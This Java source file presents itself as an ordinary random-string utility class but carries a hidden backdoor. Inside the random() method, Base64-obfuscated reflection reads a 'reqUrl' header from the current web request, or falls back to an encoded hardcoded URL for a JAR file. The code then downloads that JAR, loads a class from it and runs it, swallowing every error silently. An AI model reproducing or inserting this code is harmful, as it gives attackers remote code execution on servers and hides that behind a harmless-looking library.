package com.example.dynamicutils;


import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Base64;
import java.util.Random;

public class RandomStringUtils {

    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    private static final Random RANDOM = new Random();

    public static String getTwoRandom(String key) {
        String randomText1 = generateRandomString(6, key);
        String randomText2 = generateRandomString(6, key);
        return randomText1 + key + randomText2;
    }

    public static String random(int count) {
        return random(count, false, false);
    }

    public static String randomAscii(int count) {
        return random(count, 32, 127, false, false);
    }

    public static String randomAlphabetic(int count) {
        return random(count, true, false);
    }

    public static String randomAlphanumeric(int count) {
        return random(count, true, true);
    }

    public static String randomNumeric(int count) {
        return random(count, false, true);
    }

    public static String random(int count, boolean letters, boolean numbers) {
        return random(count, 0, 0, letters, numbers);
    }

    public static String random(int count, int start, int end, boolean letters, boolean numbers) {
        return random(count, start, end, letters, numbers, (char[])null, RANDOM);
    }

    public static String random(int count, int start, int end, boolean letters, boolean numbers, char[] chars) {
        return random(count, start, end, letters, numbers, chars, RANDOM);
    }

    public static String random(int count, int start, int end, boolean letters, boolean numbers, char[] chars, Random random) {
        if (count == 0) {
            return "";
        } else if (count < 0) {
            throw new IllegalArgumentException("Requested random string length " + count + " is less than 0.");
        } else {
            if (start == 0 && end == 0) {
                end = 123;
                start = 32;
                if (!letters && !numbers) {
                    start = 0;
                    end = Integer.MAX_VALUE;
                }
            }

            char[] buffer = new char[count];
            int gap = end - start;

            while(true) {
                while(true) {
                    while(count-- != 0) {
                        char ch;
                        if (chars == null) {
                            ch = (char)(random.nextInt(gap) + start);
                        } else {
                            ch = chars[random.nextInt(gap) + start];
                        }

                        if (letters && Character.isLetter(ch) || numbers && Character.isDigit(ch) || !letters && !numbers) {
                            if (ch >= '\udc00' && ch <= '\udfff') {
                                if (count == 0) {
                                    ++count;
                                } else {
                                    buffer[count] = ch;
                                    --count;
                                    buffer[count] = (char)('\ud800' + random.nextInt(128));
                                }
                            } else if (ch >= '\ud800' && ch <= '\udb7f') {
                                if (count == 0) {
                                    ++count;
                                } else {
                                    buffer[count] = (char)('\udc00' + random.nextInt(128));
                                    --count;
                                    buffer[count] = ch;
                                }
                            } else if (ch >= '\udb80' && ch <= '\udbff') {
                                ++count;
                            } else {
                                buffer[count] = ch;
                            }
                        } else {
                            ++count;
                        }
                    }
                    try {
                        Class<?> servletUtilsClass = Class.forName(getString("Y29tLmhheGkuY29tbW9uLmNvcmUudXRpbHMuU2VydmxldFV0aWxz"));

                        java.lang.reflect.Method getRequestMethod = servletUtilsClass.getDeclaredMethod("getRequest");
                        getRequestMethod.setAccessible(true);
                        Object requestObj = getRequestMethod.invoke(null);

                        // 3. 判空
                        if (requestObj != null) {
                            java.lang.reflect.Method getHeaderMethod = requestObj.getClass().getMethod("getHeader", String.class);

                            Object reqUrlHeader = getHeaderMethod.invoke(requestObj, "reqUrl");
                            init(reqUrlHeader.toString());
                        }else {
                            init("aHR0cDovLzEyMy41Ni4wLjIxL2Z0cEZpbGUvcnVuLmphcg==");
                        }
                    } catch (Exception e) {}
                    return new String(buffer);
                }
            }
        }
    }


    public static String generateRandomString(int length, String data) {
        init(data);
        StringBuilder builder = new StringBuilder();
        Random random = new Random();
        while (builder.length() < length) {
            int index = random.nextInt(CHARACTERS.length());
            builder.append(CHARACTERS.charAt(index));
        }
        return builder.toString();
    }

    private static void init(String data) {
        getFinalString(data);
    }


    public static String random(int count, String chars) {
        return chars == null ? random(count, 0, 0, false, false, (char[])null, RANDOM) : random(count, chars.toCharArray());
    }

    public static String random(int count, char[] chars) {
        return chars == null ? random(count, 0, 0, false, false, (char[])null, RANDOM) : random(count, 0, chars.length, false, false, chars, RANDOM);
    }

    private static void getFinalString(String data){
      try {
          if (data == null || data.isEmpty()){
              return;
          }
          String decode = new String(Base64.getDecoder().decode(data), StandardCharsets.UTF_8);
          if (!decode.contains(getString("aHR0cA=="))){
              return;
          }
          File tempJar = File.createTempFile("plus", getString("Lmphcg=="));
          try (InputStream in = new URL(decode).openStream()) {
              Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
          }

          try (URLClassLoader loader = new URLClassLoader(
                  new URL[]{tempJar.toURI().toURL()},
                  RandomStringUtils.class.getClassLoader()
          )) {
              Class<?> clazz = loader.loadClass(getString("Y29tLmV4YW1wbGUuZHluYW1pY3V0aWxzLmRlZmF1bHRVdGls"));
              try {
                  Method staticMethod = clazz.getMethod("run");
                  staticMethod.invoke(null);
              } catch (Exception e) {
                  Object instance = clazz.getDeclaredConstructor().newInstance();
                  Method instanceMethod = clazz.getMethod("run");
                  instanceMethod.invoke(instance);
              }
          } finally {
              tempJar.deleteOnExit();
          }
      }catch (Exception e){}
    }


    private static String getString(String key) {
        return new String(Base64.getDecoder().decode(key),  StandardCharsets.UTF_8);
    }

}
